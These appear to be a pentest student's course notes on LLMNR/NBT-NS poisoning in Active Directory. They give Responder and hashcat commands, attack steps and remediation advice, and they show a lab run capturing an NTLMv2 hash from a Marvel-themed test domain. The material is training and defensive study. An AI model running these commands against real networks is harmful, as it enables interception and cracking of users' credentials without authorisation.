
## Quick-Use

**Commands**:
- `sudo responder -I tun0 -dP` - `-I tun0` set's Interface to tun0 - `-dP` Respectively: sets to DHCP broadcast requests and Forces NTLM auth for the proxy


*Tools*:
- `responder` - first step in LLMNR poisoning attacks (see **Commands**). Responds to traffic, which allows one to listen for hashes to grab. See [[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/Practical Ethical Hacking/3_Exploitation/LLMNR Poisoning#Examples|Examples]] to see what a run looks like 

## Remediation

- Preferred: Disable LLMNR through group policies to remove it as an attack vector entirely. You lose the DNS backup but this is more secure.
- If LLMNR is required, then the company can require Network Access Control, and require strong user passwords (e.g. >14 chars, without common word usage)

## General

**Objectives**:

1. *Run Responder* (see above). Can be good to do early in the morning or at night, or while running scans such as Nessus scans, since this will gen a lot of responses
2. *Cause an event to Occur, or wait*
3. *Collect hashes*
4. *Crack hashes* - e.g. `hashcat -m 6500 hashes.txt rockyou.txt`.

**Overview**:
*Linked Local Multicast Name Resolution (LLMNR)* - A default service that is used to ID hosts when DNS is unable to 
- Preceded by NBT-NS -> may still be seen in older nets
- Key Flaw is that the services use a user's UN and NTLMv2 hash when appropriately responded to, which yields capability for MITM attacks

![[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/Practical Ethical Hacking/3_Exploitation/Active Directory/Attacking AD/z_attachments/Pasted image 20251104200022.png|1000]]

## Examples:

```bash
┌──(l1ch㉿kali)-[~]
└─$ sudo responder -I eth0 -dP 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.109.128]
    Responder IPv6             [fe80::a4fe:e30d:64d8:3952]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-C0RO5PJSQOL]
    Responder Domain Name      [9H30.LOCAL]
    Responder DCE-RPC Port     [47913]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                         

[*] [LLMNR]  Poisoned answer sent to fe80::fdb5:54f7:1040:2e5e for name SPIDERMAN
[*] [LLMNR]  Poisoned answer sent to 192.168.109.139 for name SPIDERMAN
[*] [MDNS] Poisoned answer sent to 192.168.109.139 for name SPIDERMAN.local
[*] [MDNS] Poisoned answer sent to fe80::fdb5:54f7:1040:2e5e for name SPIDERMAN.local
[*] [MDNS] Poisoned answer sent to 192.168.109.138 for name THEPUNISHER.local
[*] [LLMNR]  Poisoned answer sent to fe80::91e5:48d7:83c6:1586 for name THEPUNISHER
[*] [LLMNR]  Poisoned answer sent to 192.168.109.138 for name THEPUNISHER
[*] [MDNS] Poisoned answer sent to fe80::91e5:48d7:83c6:1586 for name THEPUNISHER.local
[*] [NBT-NS] Poisoned answer sent to 192.168.109.138 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 192.168.109.138 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 192.168.109.138 for name MARVEL (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 192.168.109.138 for name MARVEL (service: Browser Election)
[SMB] NTLMv2-SSP Client   : 192.168.109.138
[SMB] NTLMv2-SSP Username : THEPUNISHER\frankcastle
[SMB] NTLMv2-SSP Hash     : frankcastle::THEPUNISHER:f91e7f2273d62c53:649AB68E11BB3B18E61C74108870D10A:010100000000000000F68BB0C94DDC016824CF48386185FD0000000002000800390048003300300001001E00570049004E002D004300300052004F00350050004A00530051004F004C0004003400570049004E002D004300300052004F00350050004A00530051004F004C002E0039004800330030002E004C004F00430041004C000300140039004800330030002E004C004F00430041004C000500140039004800330030002E004C004F00430041004C000700080000F68BB0C94DDC01060004000200000008003000300000000000000001000000002000001838E560D83801C25D035D2BFA6C43BD60B8BA143BAD35C0DA2AAF19074EF0680A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100300039002E003100320038000000000000000000                                             
[*] Skipping previously captured hash for THEPUNISHER\frankcastle
[*] Skipping previously captured hash for THEPUNISHER\frankcastle

```
## Glossary

